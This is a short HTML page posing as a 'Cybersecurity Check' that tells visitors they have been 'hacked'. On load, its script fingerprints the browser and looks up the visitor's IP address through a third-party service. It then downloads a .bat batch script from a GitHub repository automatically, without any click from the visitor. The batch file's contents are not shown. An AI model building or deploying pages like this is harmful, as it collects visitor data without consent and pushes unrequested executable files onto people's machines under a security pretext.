<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cybersecurity Check</title>
</head>
<body>
    <h1>Congrats, You're Hacked Now!</h1>
    <p>Don't worry, you're safe. Please make sure to secure your systems!</p>
    <p>Your cybersecurity score: High</p>
    
    <p>Preparing your download...</p>

    <script>
        // Collecting basic system/browser details
        var userInfo = {
            browser: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timestamp: new Date().toISOString()
        };

        // Log user info (You can send it to a backend server if needed)
        console.log('Collected User Info:', userInfo);

        // Example: Collecting the user's IP address (using a third-party service)
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                userInfo.ipAddress = data.ip;
                console.log('User IP Address:', data.ip);

                // Now trigger the file download after collecting info
                triggerDownload();
            })
            .catch(error => {
                console.error('Error collecting IP address:', error);
                triggerDownload();
            });

        // Function to trigger the file download
        function triggerDownload() {
            // Automatically start downloading the .bat file from the GitHub repository
            var link = document.createElement('a');
            link.href = 'https://github.com/Aarya0017/cybersecurity-check/raw/main/cybersecurity_check.bat';
            link.download = 'cybersecurity_check.bat';
            link.click();

            // Optionally, alert the user
            alert('Your download has started.');
        }
    </script>
</body>
</html>